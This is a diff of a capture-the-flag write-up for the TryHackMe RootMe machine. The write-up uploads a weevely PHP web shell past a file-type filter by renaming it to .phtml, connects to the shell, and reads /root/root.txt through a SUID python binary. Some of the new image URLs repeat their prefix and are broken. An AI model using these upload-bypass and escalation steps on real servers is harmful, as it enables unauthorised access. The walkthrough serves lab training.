@@ -44,12 +44,12 @@ Nothing In Website
 So i started gobuster
 gobuster -u {your ip} -w /usr/share/dirb/wordlists/common.txt
 ```
-![Alt](/home/pmk/Documents/ctf/tryhackme/rootme/buster.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/buster.png)
 ```
 Found /panel and /uploads
 In Panel We Have Access To Upload Files.
 ```
-![Alt](/home/pmk/Documents/ctf/tryhackme/rootme/panel.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/panel.png)
 ```
 I Fired Up Terminal And Immediately Installed weevely
 About Weevely:
@@ -58,34 +58,34 @@ command = weevely generate {your pass} shell.php
  shell.php 
 Lets Upload It Now.
 ```
-![Alt](php-not-allow.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/php-not-allow.png)
 #### I Transalated It Using Google Transalate
-![Alt](transalate.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/transalate.png)
 #### Php Is Not Allowed
 #### Lets See Hint Which FILE UPLOAD BYPASS
 #### I googled It And Got This
-![Alt](file-bypass.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/file-bypass.png)
 ### So i Renamed From .php to .phtml
 ![Alt](uplaod.png)
 ### Now It Is Uploaded
-![Alt](success.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/success.png)
 ```
 I Remember I Also Found A Hidden Directory Named /uploads In Gobuster Lets Visit it Now
 ```
 ### Thats All We Need Lets Open It shell.phtml
-![Alt](uploads.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/uploads.png)
 
 ### Now I Fired Terminal And Typed
 ```
 weevely http://{your-ip}/uploads/shell.phtml 5142
 ```
 ## Boom I Got A Reverse Shell
-![Alt](rev-shell.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/rev-shell.png)
 ### Lets CD To user.txt
 ```
 user.txt was present inside /var/www/
 ```
-![Alt](user.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/user.png)
 # Privilage Escalation
 ### We Got Nothing using sudo -l
 ### So I Started Search For Files with SUID Permission
@@ -93,12 +93,12 @@ user.txt was present inside /var/www/
 find / -user root -perm /4000
 ```
 ### /usr/bin/python is Too Suspicious
-![Alt](python-weird.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/python-weird.png)
 ### I Know A Trick Here To Get Root.txt 
 ```
 python -c 'print(open("/root/root.txt").read())'
 ```
 ## Boom Escalation In Less Than 30 Seconds
-![Alt](priv.png)
+![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/priv.png)
 # Machine Hacked By Patan Musthakheem Khan
 ##### github.com/pmk456
